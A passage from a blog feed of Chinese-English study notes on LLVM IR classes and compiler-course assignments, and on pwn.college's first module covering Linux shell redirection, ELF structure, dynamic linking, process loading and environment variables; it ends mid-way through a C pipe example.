&gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list &amp;&amp; \</span><br><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br></code></pre></div></td></tr></table></figure><h1 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h1><h2 id="CLI-Guide"><a href="#CLI-Guide" class="headerlink" title="CLI Guide"></a>CLI Guide</h2><ul><li>-load: load additional library    -{pass_name}    ./test/Loop.c: <strong>check file(expected)</strong>    stdin of FileCheck: <strong>input file</strong><br>  if correct, nothing will be printed.<br>  需要先在FunctionInfo文件夹执行make.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">opt -load ./FunctionInfo.so -function-info ./test/Loop.bc \<br>-disable-output | FileCheck --check-prefix=SAMPLE ./test/Loop.c<br></code></pre></div></td></tr></table></figure><h2 id="Code-Representation-IR"><a href="#Code-Representation-IR" class="headerlink" title="Code Representation: IR"></a>Code Representation: IR</h2><ul><li>LLVM is strongly typed with a simple type system. such as <code>i32</code> type.</li><li>the calling convention is abstracted through <code>call</code> and <code>ret</code> instructions and explicit arguments</li><li> it uses <strong>an infinite set of temporaries</strong> named with a % character instead of specific named registers. </li><li>LLVM IR is actually defined in <strong>three</strong> isomorphic forms: the <strong>textual</strong> format above, an <strong>in-memory data structure</strong> inspected and modified by optimizations themselves, and an efficient and dense on-disk binary “<strong>bitcode</strong>“ format.<ul><li><code>.bc</code> is bitcode, <code>.ll</code> is textual format.</li></ul></li><li></li></ul><h2 id="Class-Architecture"><a href="#Class-Architecture" class="headerlink" title="Class Architecture"></a>Class Architecture</h2><h3 id="IR所有头文件"><a href="#IR所有头文件" class="headerlink" title="IR所有头文件"></a><a href="https://llvm.org/doxygen/dir_c3e93f23a4a31c717998b98ce143b7c0.html">IR所有头文件</a></h3><h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-value-class">Value</a></h3><p>就和名字一个意思, It represents a typed value that may be used (among other things) as an operand to an instruction. To keep track of this relationship, the <code>Value</code> class keeps a list of all of the <code>User</code>s that is using it( 就是<code>Use *UseList;</code>)</p><p>有一些getType, getValue, use_list_iterator之类的成员函数.</p><img src="../../image/CSCD70/image-20220315181757882.png" alt="image-20220315181757882" style="zoom: 80%;" /><h3 id="BB"><a href="#BB" class="headerlink" title="BB"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-basicblock-class">BB</a></h3><p>没啥好说的. 查就完事了.</p><h3 id="User"><a href="#User" class="headerlink" title="User!!!"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-user-class">User</a>!!!</h3><p>It exposes a list of “Operands” that are all of the <code>Value</code>s that the User is referring to.</p><p>Because LLVM uses <strong>Static Single Assignment (SSA)</strong> form, there can only be one definition referred to, allowing this direct connection. This connection provides the use-def information in LLVM. 真巧, 因为采用了SSA所以实现了一一对应的指针.</p><p>有一些<code>getOperand</code>, <code>getNumOperands</code>之类的函数(显而易见了). 像这种的都会有迭代器.</p><p>派生类包括==Constant, Instruction, Operator==之类的(因inst operator有很多种子类所以图片过长).</p><p><strong>几个重要的问题: User为什么继承于Value? User和Use有什么关系?</strong> </p><ul><li><p>第一个问题, 比如说Instruction class(假设是<code>%add1 : x = y + z</code>)继承链为<code>Value&lt;-User&lt;-Instruction</code>, 既有value的definition(x), 也有use(y和z). </p><p><code>replaceAllUsesWith()</code>是Value的method, 替换掉所有引用x的use, 即def-use chain;<br><code>replaceUsesOfWith()</code>是User的method, 替换y, z所指向的value, 即use-def chain(由于SSA所以可以实现一一对应).</p></li><li><p>第二个, LLVM的<a href="https://llvm.org/docs/ProgrammersManual.html#interaction-and-relationship-between-user-and-use-objects">doc</a>和<a href="https://stackoverflow.com/questions/35370195/llvm-difference-between-uses-and-user-in-instruction-or-value-classes">Stack Overflow</a>有相关解释. (Use s will <code>inline</code> or <code>hung off</code>)下面这种情况就是hung off, <code>use**</code>数组通过重写operator new的方式附加在User class前面. 而在Value class中则有<code>Use *UseList;</code> , 所以在User中也有uselist.</p><p>在Use class中, Value和User都作为friend class.</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...---.---.---.---.-------...<br>  | P | P | P | P | User<br><span class="hljs-string">&#x27;&#x27;&#x27;---&#x27;---&#x27;---&#x27;---&#x27;-------&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="Instruction"><a href="#Instruction" class="headerlink" title="Instruction"></a><a href="https://llvm.org/doxygen/classllvm_1_1Instruction.html">Instruction</a></h3><p>真的是一堆派生类.</p><p>To represent a specific type of instruction, one of many subclasses of <code>Instruction</code> are used. 真的非常多, 比如说二元运算符和UnaryInstruction(又分成UnaryOperator和LoadInstruction之类的).</p><p>继承图: Value&lt;(继承自)-User&lt;-Instruction</p><p><strong>写个代码又发现之前看文档没看懂的地方(还是得拿源码出来)</strong> </p><p><a href="https://github.com/llvm/llvm-project/blob/main/llvm/include/llvm/IR/Instruction.def#L126"><code>llvm/Instruction.def</code></a> file. This file contains some meta-data about <strong>the various different types</strong> of instructions in LLVM. </p><p>在instruction.h中有下面这个enum, 而Instruction.def中是一大串没有实例化的#define, 在enum中实例化所需的操作后include那个文件就可以实现在enum里面通过预处理后显示<code>ADD = 13(即 OPC = N )</code>了. 不过这种写法doxygen并不能识别出来.</p><p>写成 <code>Instruction::ADD</code> 就可以使用这个枚举变量了.</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Instruction</span> :</span> ... &#123; ...<br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BinaryOps</span> &#123;</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  FIRST_BINARY_INST(N)             BinaryOpsBegin = N,</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HANDLE_BINARY_INST(N, OPC, CLASS) OPC = N,</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>   LAST_BINARY_INST(N)             BinaryOpsEnd = N+1</span><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/IR/Instruction.def&quot;</span></span><br>  &#125;;<br>  ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="Constant"><a href="#Constant" class="headerlink" title="Constant"></a>Constant</h3><p>Constant represents a base class for different types of constants.</p><p>It is subclassed by <strong>ConstantInt</strong>, <strong>ConstantArray</strong>, etc. for representing the various types of Constants. </p><p>成员函数有比如getSExtValue这样的, 还有个getSigned静态成员函数等等.</p><img src="../../image/CSCD70/image-20220317122408594.png" alt="image-20220317122408594" style="zoom:67%;" /><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a><a href="https://llvm.org/docs/ProgrammersManual.html#the-function-class">Function</a></h3><img src="../../image/CSCD70/image-20220315185203276.png" alt="image-20220315185203276" style="zoom:67%;" /><h3 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h3><p>Every <code>Value</code> has a <code>Type</code>. 有一个<code>SubClassData</code>可以在派生类中存储数据, 使用<code>Type class</code>中的<code>set~()</code>即可设置.</p><p>有一个我查了挺久的问题: <strong>Function和FunctionType有什么区别?</strong> </p><ul><li>The <code>Function</code> class keeps track of a <strong>list</strong> of <a href="https://llvm.org/docs/ProgrammersManual.html#basicblock">BasicBlock</a>s, a <strong>list</strong> of formal <a href="https://llvm.org/docs/ProgrammersManual.html#argument">Argument</a>s, and a <a href="https://llvm.org/docs/ProgrammersManual.html#symboltable">SymbolTable</a>.<br>有像getArgumentList这样的函数. 基本都是存储一个list的信息.</li><li>而FunctionType的功能就像下面所展示的那样, 存储着编程层面上/一个函数的基本信息. </li></ul><blockquote><p>**FunctionType: ** </p><p>Subclass of DerivedTypes for function types.</p><ul><li><code>bool isVarArg() const</code>: Returns true if it’s a vararg function.</li><li><code>const Type * getReturnType() const</code>: Returns the return type of the function.</li><li><code>const Type * getParamType (unsigned i)</code>: Returns the type of the ith parameter.</li><li><code>const unsigned getNumParams() const</code>: Returns the number of formal parameters.</li></ul></blockquote><img src="../../image/CSCD70/image-20220315183948503.png" alt="image-20220315183948503" style="zoom:67%;" /><h1 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h1><blockquote><p>参考博客<a href="https://kiprey.github.io/2020/06/LLVM-IR-pass/#4-%E5%9F%BA%E6%9C%AC%E5%9D%97%E7%9A%84%E4%BC%98%E5%8C%96">在此</a>, 即基本概念+LLVM实例.</p></blockquote><h2 id="Assignment1"><a href="#Assignment1" class="headerlink" title="Assignment1"></a>Assignment1</h2><p>环境调整:</p><ul><li> 不知道哪个lit是个什么东西, 装在了python模块里面但是又好像是llvm-lit, 明明看到了这个命令但是装上了llvm也没见到. 毁灭吧, 不用这个什么测试了. 好吧<code>pip install lit</code>就成功了. 和我这两个用户共享同一个home文件夹有关系. </li><li>直接make test检查的是<code>.ll</code>, 难怪通过不了, 直接使用FileCheck使用的是<code>.c</code>中的CHECK. 但是Function Information任务结果和CHECH中的明显不同, 自然不会成功. </li><li>ctest是cmake使用的test suit. lit是llvm的test suit. </li><li>FunctionInfo和LocalOpt要<strong>作为两个文件夹打开</strong>才会有智能补全. </li><li></li></ul><p>Assignment: </p><ul><li>(1) Algebraic Identity</li><li>(2) Strength Reduction</li><li>(3) Multi-Instruction Optimization</li></ul><p>经过在文档里的一番倒腾终于会了一些基本操作, <code>dyn_cast</code> <code>replaceAllUsesWith</code> <code>getOperand</code> 这些东西等等.</p><h2 id="Assignment2"><a href="#Assignment2" class="headerlink" title="Assignment2"></a>Assignment2</h2><ul><li>到达-定值分析（Reaching-Definition Analysis)</li><li>活跃变量分析（Live-Variable Analysis)</li><li>可用表达式分析 (Available-Exprssion Analysis)</li><li>SSA ( static single assignment )</li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn modules的一点笔记</title>
    <link href="/2022-01/Now-pwn-modules/"/>
    <url>/2022-01/Now-pwn-modules/</url>
    
    <content type="html"><![CDATA[<ul><li><p>连接</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh -i ~/pwn.college/pwnkey hacker@dojo.pwn.college <br></code></pre></div></td></tr></table></figure></li><li><p>传文件到dojo或拉取</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i ~/pwn.college/pwnkey [文件] hacker@dojo.pwn.college:<br>scp -i ~/pwn.college/pwnkey hacker@dojo.pwn.college:[文件] ./<br></code></pre></div></td></tr></table></figure></li><li><p><strong>可以创建flag的符号链接, 不过除了$HOME其他目录均不能写, 只能在<code>~/</code>下.</strong> </p></li></ul><h1 id="module-1-communication"><a href="#module-1-communication" class="headerlink" title="module 1-communication"></a>module 1-communication</h1><h2 id="The-file-system"><a href="#The-file-system" class="headerlink" title="The file system"></a>The file system</h2><p><img src="../../image/pwn-modules/image-20220117165401525.png" alt="image-20220117165401525"></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ln -s /old/path /new/path<br>&lt;in_file:      redirect in_file into the command&#x27;s input<br><span class="hljs-meta">&gt;</span><span class="bash">out_file:     redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s output into out_file, overwriting it</span></span><br><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-string">&gt;out_file:    redirect the command&#x27;</span>s output into out_file, appending to it</span><br><span class="hljs-meta">2&gt;</span><span class="bash">error_file:  redirect the <span class="hljs-built_in">command</span><span class="hljs-string">&#x27;s errors into error_file, overwriting it</span></span><br><span class="hljs-meta">2&gt;</span><span class="bash"><span class="hljs-string">&gt;error_file: redirect the command&#x27;</span>s errors into error_file, appending to it</span><br></code></pre></div></td></tr></table></figure><h2 id="Binary-files"><a href="#Binary-files" class="headerlink" title="Binary files"></a>Binary files</h2><blockquote><p>教程还是挺绝的, slide可以做为基础知识的详细参考资料. Binaryfiles的slide在<a href="https://docs.google.com/presentation/d/1wrX8tvwaxIEk5hx4OtQmPqps-MScIaDO-9bTKQqr8vI/edit#slide=id.g9265d66f8d_0_26">这里</a> </p><p><a href="https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">ELF base struct: header-sections-segments</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-2-symbols/">symbols</a><br><a href="https://www.intezer.com/blog/elf/executable-and-linkable-format-101-part-3-relocations/">relocations</a><br><a href="https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/">dynamic-linking</a> </p></blockquote><ul><li>ELF is a binary file format.<br>  Contains the program and its data.Describes how the program should be loaded (<em>program/segment headers</em>).Contains metadata describing program components (<em>section headers</em>).</li><li><strong>sections</strong> gather all needed information to link a given object file and build an executable,<br>  while <strong>Program Headers</strong> split the executable into segments with different attributes, which will eventually be loaded into memory.</li><li>Section headers are <em><strong>not</strong></em> a necessary part of the ELF. <em>Section headers</em> are just <strong>metadata</strong>.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> file /bin/cat</span> <br>/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e6afa43e1e280bd06c018f541c7ae46a2ebda83c, for GNU/Linux 3.2.0, stripped<br></code></pre></div></td></tr></table></figure><ul><li>Several ways to dig in: 在CSAPP里, 当初看的时候被我忽略掉了…<ul><li><input checked="" disabled="" type="checkbox"> <strong>gcc</strong> to make your ELF.</li><li><input checked="" disabled="" type="checkbox"> <strong>readelf</strong> to parse the ELF header.</li><li><input checked="" disabled="" type="checkbox"> <strong>objdump</strong> to parse the ELF header and disassemble the source code.</li><li><input checked="" disabled="" type="checkbox"> <strong>nm</strong> to view your ELF’s symbols.</li><li><input disabled="" type="checkbox"> <strong>patchelf</strong> to change some ELF properties.</li><li><input checked="" disabled="" type="checkbox"> <strong>objcopy</strong> to swap out ELF sections.</li><li><input disabled="" type="checkbox"> <strong>strip</strong> to remove otherwise-helpful information (such as symbols).</li><li><input disabled="" type="checkbox"> <a href="https://ide.kaitai.io/"><strong>kaitai struct</strong></a> to look through your ELF interactively</li></ul></li></ul><h3 id="ELF-base-struct"><a href="#ELF-base-struct" class="headerlink" title="ELF base struct"></a>ELF base struct</h3><p>ELF files are composed of three major components:</p><ul><li><strong>ELF Header</strong> : contains general information about the binary <code>readelf -h &lt;executable&gt;</code> </li><li><strong>Sections</strong> : comprise all information needed for linking a target object file in order to build a working executable <code>readelf -S &lt;executable&gt;</code></li><li><strong>Segments</strong> : break down the structure of an ELF binary into suitable chunks to prepare the executable to be loaded into memory</li></ul><blockquote><p>每个section的意义还是要注意一下, 我又倒回来看.got.plt了</p></blockquote><p>注意segment在链接的时候没有作用, section在运行时没有作用.</p><p>一方面Segment通过把section分组来提高装载的效率, 另一方面要注意必须和物理页大小对齐, 以便于pte中的权限控制.</p><h3 id="Symbols"><a href="#Symbols" class="headerlink" title="Symbols"></a>Symbols</h3><p><strong>Provide interface to Linkers and Debuggers to enforce their functionality.</strong> </p><p>.dynstr是.dynsym的string table, The section <em>.strtab</em> is the <em>String Table</em> of <em>.symtab Symbol Table</em>. 而且string table的entry数量和symbol table的entry数量一致.</p><p><img src="../../image/pwn-modules/photo_2018-01-13_11-28-32.jpg"></p><h3 id="relocation"><a href="#relocation" class="headerlink" title="relocation"></a>relocation</h3><ol><li><strong>Defining Relocations</strong> </li></ol><p>There are different types of <u>relocatable files</u>:</p><ul><li>Generic object files (*.o).     比较简单, 就是一个静态链接的文件.</li><li>Kernel object files (*.ko).     wait for future</li><li>Shared object files (*.so).    <ul><li>These type of relocatable files support being linked on runtime, and they may be shared across different processes. Consequently, relocations of dynamic dependencies have to be done at runtime. This process is known as Dynamic Linking.</li></ul></li></ul><p>Elfxx_Rel and Elfxx_Rela差在一个Addend上, 也就是要重定位的位置和下一条指令地址的差值<strong>取反</strong>.</p><p>其他的部分看原博客<a href="https://www.intezer.com/blog/malware-analysis/executable-and-linkable-format-101-part-3-relocations/">就行</a>, 东西太多必须每一段意思都要懂, 不过重定位条目比较少也容易记住.</p><h3 id="Dynamic-Linking"><a href="#Dynamic-Linking" class="headerlink" title="Dynamic Linking"></a>Dynamic Linking</h3><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>Unlike in static linking, <em><strong>ld</strong></em> requires shared libraries to create a dynamically linked executable.<br>The output file will contain the <strong>executable’s code</strong> and <strong>the names of the shared libraries</strong> required.</p><p>When the binary is executed, the dynamic linker will find the required dependencies to <strong>load</strong> and link them together.</p><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The dynamic linking process begins immediately after execution.</p><p>With dynamically linked programs, the system executes the file’s “<strong>interpreter</strong>”, which is an <u>intermediate</u> program that should <strong>set up the environment and only then execute the main binary</strong>. The interpreter lies in the <em>PT_INTERP</em> segment created by the compile-time linker (<em><strong>ld</strong></em>).</p><p>The dynamic linker will <strong>set up the environment</strong> <u>using dynamic entries</u> from the <em>.dynamic</em> section:</p><p>preparing the environment:</p><ol><li>Load the original file’s PT_LOAD segments in memory.</li><li>Use the <em>.dynamic</em> section/segment to read dependencies, search for them on disk and load them in memory as well. This is done recursively for dependent libraries—they can be dynamically linked as well. The dependency searching algorithm is outlined in the <a href="http://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so man page</a>.</li><li>Perform relocations – shared libraries are loaded into non-deterministic addresses and must have absolute addresses patched, as well as resolving references to other object files.</li><li>Invoke shared library initialization functions (registered in the <em>.preinit_array, .init, .init_array</em> sections). <strong>What happened?</strong> </li><li>Finally, pass control back to the original binary’s entry point, making it seem to the binary that control was passed directly from <em>exec</em>.</li></ol><p>还讲到了<strong>LD_PRELOAD</strong>和<strong>LD_LIBRARY_PATH</strong>变量…还是看原文吧…</p><h4 id="Lazy-Linking"><a href="#Lazy-Linking" class="headerlink" title="Lazy Linking"></a>Lazy Linking</h4><p>lazy linking的原因是如果一个程序开头出错了马上退出, rendering useless all of the relocation work performed by the dynamic linker, 所以将一些链接工作放到实际调用的时候.</p><p>在CSAPP中看过了, 基本相同, 不同在于提供了IDA的视图看法.</p><h2 id="Process-Loading"><a href="#Process-Loading" class="headerlink" title="Process Loading"></a>Process Loading</h2><ol><li><p>A process is created.</p><p> by fork() or clone() and execve().</p></li><li><p>Cat is loaded.</p><ul><li><p>must be executable</p><p>To figure out what to load, the Linux kernel reads the beginning of the file (i.e., /bin/cat), and makes a decision:</p></li><li><p>If the file starts with <strong>#!</strong>, the kernel extracts the interpreter from the rest of that line and executes this interpreter with the original file as an argument.</p></li><li><p>If the file matches a format in <strong>/proc/sys/fs/binfmt_misc</strong>, the kernel executes the interpreter specified for that format with the original file as an argument.</p></li><li><p>If the file is a <strong>dynamically-linked</strong> ELF, the kernel reads the interpreter/loader defined in the ELF, loads the interpreter and the original file, and lets the interpreter take control.</p></li><li><p>If the file is a <strong>statically-linked</strong> ELF, the kernel will load it.Other legacy file formats are checked for</p><p>notice the interpreter specified in .interp section.</p><p><strong>Dynamically linked ELFs: the loading process</strong> </p></li><li><p>The program and its interpreter are <u>loaded by the kernel</u>.</p></li><li><p>The interpreter <u>locates the libraries</u>.<br>  a. LD_PRELOAD environment variable, and anything in /etc/ld.so.preload<br>  b. LD_LIBRARY_PATH environment variable (can be set in the shell)<br>  c. DT_RUNPATH or DT_RPATH specified in the binary file (both can be modified with patchelf)<br>  d.system-wide configuration (/etc/ld.so.conf)<br>  e. /lib and /usr/lib</p></li><li><p>The interpreter <u>loads the libraries</u>.<br>  a.  these libraries can depend on other libraries, causing more to be loadedb.relocations updated</p></li></ul></li><li><p><a href="https://docs.google.com/presentation/d/1TwM5WLWnTqrNkpXjGKkaXYbKZEpatEQYA7ckBVXAOhs/edit#slide=id.g40953d030c_0_179">Cat is initialized</a>.</p><p> <strong>/proc/self/maps</strong> and <strong>attribute((constructor))</strong> </p></li></ol><p>Further readings:</p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html">How does the Linux kernel run a program</a> </p><p><a href="https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4">Linux: Understanding the Memory Layout of Linux Executables</a> </p><h2 id="Process-Execution"><a href="#Process-Execution" class="headerlink" title="Process Execution"></a>Process Execution</h2><p>用命令行演示了非常多的内容, 基本都没见过我尽量记录下一些细节. <a href="https://docs.google.com/presentation/d/1ezY9Q8I0tzDD-7ZDXMbQM5RQ7z1dvB9-U_nDEhc6qdE/edit#slide=id.g9279416eed_1_114">谷歌文档</a> </p><ol><li>Cat is launched.</li><li>Cat reads its arguments and environment.</li><li>Cat does its thing.</li><li>Cat terminates. </li></ol><p>上面四个是这一部分要考虑的流程, 我也按流程走:</p><h3 id="Cat-is-launched"><a href="#Cat-is-launched" class="headerlink" title="Cat is launched"></a>Cat is launched</h3><p><code>__libc_start_main()</code>, 又是这个函数, 不过在这之前还有一个<code>_start()</code>, 形成<code>_start()-&gt;__libc_start_main()-&gt;main()</code>流程.</p><blockquote><p>可以指定一下LD_PRELOAD参数来改变__libc_start_main()之类的操作</p></blockquote><h3 id="Cat-reads-arg-amp-env"><a href="#Cat-reads-arg-amp-env" class="headerlink" title="Cat reads arg &amp; env"></a>Cat reads arg &amp; env</h3><p>在下一节中有介绍, 视频里示范了一个改环境变量的例子.</p><p>在执行ls指令的时候 添加<code>LANG = C</code>环境变量, 会导致排序按照ASCII码, 否则会按照系统默认的<code>en_US-UTF-8</code> </p><h3 id="Cat-does-thing"><a href="#Cat-does-thing" class="headerlink" title="Cat does thing"></a>Cat does thing</h3><p>讲到了库函数, 系统调用, 信号, 共享内存. </p><p>通过nm指令来查看symbol, strace的使用, 以及libc库函数可以不用写头文件, 不过会引起一个隐式声明警告, 可以通过man来查看需要引用什么头文件. </p><p>信号演示的时候用了<code>ps pgrep</code>两个指令, 看ps的manual知道了参数有三种风格. 共享内存演示了/dev/shm, <strong>还不知道这怎么用</strong> </p><p>还有一个进程terminate, 和我在操作系统中看到的一致, 不重复了.</p><p>剩下的在PPT里.</p><h2 id="命令行参数和环境变量"><a href="#命令行参数和环境变量" class="headerlink" title="命令行参数和环境变量"></a>命令行参数和环境变量</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">char</span> **envp)</span></span><br></code></pre></div></td></tr></table></figure><p>main函数的参数, 其中argv和envp是字符串数组的指针, 所以是二重指针, 两个数组的最后一个元素是null.</p><p>就像这样子:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -o <span class="hljs-built_in">test</span> test.c</span><br><span class="hljs-meta">$</span><span class="bash"> ./<span class="hljs-built_in">test</span> testing</span><br>The number of arguments is: 2<br><br>First arg:     The program name is: ./test<br>Second arg: The first argument is: testing<br><br>The first environment variable is: PWD=/home/yans # process working directory<br>The second environment variable is: SHLVL=1<br></code></pre></div></td></tr></table></figure><p><code>env</code> runs a command with a modified environment. 也可以设置特定的环境变量.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> env -i ./countenv</span>                   <br>There are 0 environment variables.<br></code></pre></div></td></tr></table></figure><h2 id="PIPE"><a href="#PIPE" class="headerlink" title="PIPE"></a>PIPE</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> &#123;</span><br>    <span class="hljs-keyword">int</span> pid;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdin</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stdout</span>;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">stderr</span>;<br>&#125;;<br><span class="hljs-keyword">void</span> __close(<span class="hljs-keyword">int</span> fd) &#123;<br>    <span class="hljs-keyword">if</span> (close(fd) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not close pipe end&quot;</span> ); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mk_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fds[<span class="hljs-number">2</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(fds) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not create pipe&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mv_fd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span> </span>&#123;<br>    <span 